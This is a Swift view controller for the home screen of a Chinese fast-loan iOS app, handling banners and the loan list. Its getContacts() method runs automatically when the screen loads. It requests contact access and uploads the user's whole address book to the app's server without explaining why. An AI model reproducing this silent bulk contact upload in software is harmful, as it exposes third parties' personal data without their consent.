//
//  RHomeViewController.swift
//  RFastLoan
//
//  Created by RPK on 2018/11/1.
//  Copyright © 2018 RPK. All rights reserved.
//

import UIKit
import SnapKit
import MJRefresh
import AddressBook
import AddressBookUI

class RHomeViewController: RBaseViewController {
    
    var tableView : UITableView?
//    var dataSource : Array<RHomeBannerItem>!
    var dataSource : Array<RLoanModel>!
    var bannerList = Array<RHomeBannerItem>()
    let cellIdentifier = "identifier"
    let pageSize = 20
    var pageIndex = 1
    var homeHeaderView : RHomeHeaderView!
    override func viewDidLoad() {
        super.viewDidLoad()
        
        initView()
        initData()
        getContacts()
//        loadMoreData()
        // Do any additional setup after loading the view.
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        
    }
    /*
    // MARK: - Navigation

    // In a storyboard-based application, you will often want to do a little preparation before navigation
    override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
        // Get the new view controller using segue.destination.
        // Pass the selected object to the new view controller.
    }
    */

}

extension RHomeViewController {
    
    private func initView() {
        
        self.navigationItem.title = "速贷管理平台"
        dataSource = Array()
        
        homeHeaderView = RHomeHeaderView.init(frame: CGRect.init(x: 0, y: 0, width: kScreenWidth, height: 160 + 10 + 40))
        homeHeaderView.backgroundColor = .white
        
        tableView = UITableView.init(frame: CGRect.zero, style: UITableView.Style.plain)
        tableView?.delegate        = self
        tableView?.dataSource      = self
        tableView?.rowHeight       = 70
        tableView?.tableHeaderView = homeHeaderView
        tableView?.tableFooterView = UIView()
        view.addSubview(tableView!)
        tableView?.register(RHomeTableViewCell.classForCoder(), forCellReuseIdentifier: cellIdentifier)
        tableView?.snp.makeConstraints({ (make) in
            make.edges.equalTo(UIEdgeInsets.init(top: 0, left: 0, bottom: kTabbarHeight, right: 0))
        })
        
        
    }
}

extension RHomeViewController {
    private func initData() {
        let viewModel = RHomeBannerViewModel()
        viewModel.getHomeBannerList(code: "index", page: pageIndex, pageSize: pageSize)
            .subscribe(onNext: { (list) in
//                self.bannerList = list.toArray()
                self.homeHeaderView.settingBannerList(list.toArray())
            })
            .disposed(by: disposeBag)
        
        viewModel.getLoanInfoList()
            .subscribe (onNext:{ (list) in
                self.dataSource = list.toArray()
                self.tableView?.reloadData()
            })
            .disposed(by: disposeBag)
    }
    
    private func loadMoreData() {
//        let viewModel = RHomeBannerViewModel()
//        tableView?.mj_header = MJRefreshHeader.init(refreshingBlock: {
//            self.pageIndex = 1
//            viewModel.getHomeBannerList(code: "index", page: self.pageIndex, pageSize: self.pageSize)
//            .subscribe(onNext: { (list) in
//                self.dataSource.removeAll()
//                self.dataSource = list.toArray()
//                self.tableView?.reloadData()
//            })
//            .disposed(by: self.disposeBag)
//        })
//
//        tableView?.mj_footer = MJRefreshAutoFooter.init(refreshingBlock: {
//            self.pageIndex += 1;
//            viewModel.getHomeBannerList(code: "index", page: self.pageIndex, pageSize: self.pageSize)
//                .subscribe(onNext:{ list in
//                    self.dataSource.append(contentsOf: list.toArray())
//                    self.tableView?.reloadData()
//                })
//                .disposed(by: self.disposeBag)
//        })
    }

    func getContacts() {
        let contact = RContacts()
        contact.requestContactAuthorAfterSystemVersion9()
        
        let data : NSData! = try? JSONSerialization.data(withJSONObject: contact.contactDatas, options: []) as NSData!
        let viewModel = RHomeBannerViewModel()
        viewModel.uploadContacts(contacts: data as Data)
            .subscribe(onNext: { (httpResult) in
                print("上传通讯录")
            })
            .disposed(by: disposeBag)
        
//        let jsonStr = getJSONStringFromArray(array: contact.contactDatas)
        
    }
    
    //数组转json
    func getJSONStringFromArray(array:NSArray) -> String {
        
        if (!JSONSerialization.isValidJSONObject(array)) {
            print("无法解析出JSONString")
            return ""
        }
        
        let data : NSData! = try? JSONSerialization.data(withJSONObject: array, options: []) as NSData!
        let JSONString = NSString(data:data as Data,encoding: String.Encoding.utf8.rawValue)
        return JSONString! as String
        
    }

}

extension RHomeViewController: UITableViewDataSource, UITableViewDelegate {
    
    func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
        return 75
    }
    
    // required modal
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return dataSource.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let cell : RHomeTableViewCell = tableView.dequeueReusableCell(withIdentifier: cellIdentifier) as! RHomeTableViewCell
        cell.settingData(dataSource[indexPath.row])
        return cell
    }
    
}
